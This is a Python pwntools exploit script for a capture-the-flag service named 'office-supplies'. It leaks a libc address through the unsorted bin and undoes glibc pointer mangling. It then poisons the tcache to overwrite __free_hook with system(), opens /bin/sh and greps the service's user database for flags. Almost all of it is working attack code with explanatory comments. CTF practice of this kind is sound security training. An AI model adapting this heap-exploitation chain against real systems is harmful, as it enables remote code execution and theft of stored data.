#!/usr/bin/env python3
from pwn import *
import secrets

# Set up pwntools for the correct architecture
context.update(arch='amd64', terminal=['alacritty', '-e', 'sh', '-c'])


# This exploit should also work for libc versions with ptr obfuscation (that still have __free_hook)
# However we explicitely used an old one in the ctf to make exploit development easier
LIBC_HAS_PTR_OBFUSCATION = False


binary = ELF('bin/office-supplies')
libc = ELF('bin/libc.so.6')


# ===========================================================
#                     EXPLOIT GOES HERE
# ===========================================================

io = remote("fd66:666:995::2", 1337)

# Logging in
io.sendline(b"1\n" + secrets.token_hex(16).encode() + b"\n" + secrets.token_hex(16).encode() + b"\nH4x0r")
io.recvuntil(b"Welcome")

# Some helper functions to access common service functionality
def sell(name, cost, data, length=None):
    io.sendlineafter(b'> ', b"3")
    io.sendline(name)
    io.sendline(str(cost).encode())
    if length is not None:
        io.sendline(str(length).encode())
    else:
        io.sendline(str(len(data)).encode())
    io.sendline(data.hex().encode())

def edit(name, new_cost, new_data, length=None):
    io.sendlineafter(b'> ', b"4")
    io.sendline(name)
    io.sendline(str(new_cost).encode())
    if length is not None:
        io.sendline(str(length).encode())
    else:
        io.sendline(str(len(new_data)).encode())
    io.sendline(new_data.hex().encode())

def buy(name):
    io.sendlineafter(b'> ', b"2")
    io.sendline(name)
    io.recvuntil(b"Here is the blueprint:\n")
    return io.recvline()

# Defeat glibc's heap pointer obfuscation
# mangled = ptr ^ (address >> 12), where address is the address the pointer is stored at
# If the pointer is stored in the same page, we can fully recover the leaked pointer value,
# as we know the first 12 bits
def unmangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# Leak a libc address (unsorted bin attack)
# The first/last chunk in the unsorted bin points to the libc main_arena+96 with their next/prev pointer
# For a chunk to be put into the unsorted bin it must be big enough so that a tcache/fastbin is too small
# Also, we are allocating three chunks to gain some memory fragmentation
# If we would not do this, then upon freeing the chunk it would instantly be consolidated with the previous
# or the top chunk, bypassing the unsorted bin and preventing a libc leak

product = secrets.token_hex(16).encode()
product2 = secrets.token_hex(16).encode()
sell(product, 100, b'3' * 4096)
sell(product2, 69, b'3' * 4096)
sell(secrets.token_hex(16).encode(), 69, b'3' * 4096, length=0)
edit(product2, 1, b'6' * 4096)
edit(product, 1, b'2' * 4096)

leak = buy(product)[:32].decode()
fwd = u64(bytes.fromhex(leak[:16]))
bwd = u64(bytes.fromhex(leak[16:]))
libc.address = bwd - 0x1ecbe0 #(libc.sym['main_arena'] + 96)

log.info(f'{hex(fwd)=}')
log.info(f'{hex(bwd)=}')
log.info(f'       libc @ {hex(libc.address)}')
log.info(f'__free_hook @ {hex(libc.sym["__free_hook"])}')
log.info(f'     system @ {hex(libc.sym["system"])}')

# Because the heap layout depends on the data in the database, this sometimes fails
# Maybe this exploit can be made a bit more stable...
# But it works most of the time, just run the script again if it fails
assert (libc.address & 0xfff) == 0, "Heap leak failed. This happens sometimes. Please try again"


# Leak a heap pointer to defeat glibc's pointer obfuscation
# which is mangled = ptr ^ (address >> 12), where address is the address the pointer is stored
# Because we know the first 12 bits, we can fully reverse this, see the unmangle function
# In libc < 2.33, there is no ptr obfuscation
product = secrets.token_hex(16).encode()
sell(product, 2, b'0' * 512)
edit(product, 1, b'1' * 512)
leak = buy(product)[:16].decode()

if LIBC_HAS_PTR_OBFUSCATION:
    mangle = unmangle(u64(bytes.fromhex(leak))) >> 12
    log.info(f'       heap @ {hex(mangle)}')
else:
    mangle = 0


# We can use the bug report functionality to easily edit a freed chunk
# Here, we allocate the previously freed chunk...
io.sendlineafter(b"> ", b"5")
io.sendlineafter(b"> ", b"3")
io.sendline(b"512")
io.send(b"a" * 512)

io.sendlineafter(b"> ", b"5")
#... And free it, so that it is inside the tcache again
edit(product, 1, b'b')

io.sendlineafter(b"> ", b"5")
io.sendlineafter(b"> ", b"3")
# Overwrite the fwd pointer of the chunk in tcache with our target
# Don't forget to obfuscate the address!
io.sendline(p64(libc.sym['__free_hook'] ^ mangle) + b'c' * 504)

io.sendlineafter(b"> ", b"5")
# The chunk we used to overwrite the fwd pointer will be returned during the next malloc()
# allocate it to get it out of our way
sell(secrets.token_hex(16).encode(), 12, b'F' * 512)

# Overwrite __free_hook with the address of the system function!
sell(secrets.token_hex(16).encode(), 0xdeadbeef, p64(libc.sym['system']) + b'\x00' * 504)

# Now everything we free will be executed via system()
# e.g. the input from the menu (String is a heap allocated type)
io.sendlineafter(b"> ", b'/bin/sh\x00')

# Get all the flags!!!
io.sendlineafter(b'> ', b'strings data/user.db | grep -e FAUST -e FLAG')
print(io.recvallS(timeout=1))
